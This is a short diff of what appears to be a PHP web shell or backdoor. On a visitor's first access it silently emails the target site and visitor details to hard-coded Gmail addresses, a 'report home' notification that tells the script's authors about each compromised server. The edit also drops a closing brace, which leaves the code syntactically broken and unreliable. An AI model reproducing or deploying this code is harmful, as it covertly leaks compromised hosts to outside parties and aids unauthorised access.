@@ -49,7 +49,7 @@ if ($visitc == "") {
   $body    = "Bug: $target by $visitor";
   if (!empty($web)) { @mail("rootcyberpunks@gmail.com",$judul,$body); }
 }
-	if (!empty($web)) { mail("muhrazky@gmail.com",$judul,$body); }
+	if (!empty($web)) { mail("muhrazky@gmail.com",$judul,$body); 
 }
 else { $visitc++; }
 @setcookie("visitz",$visitc);
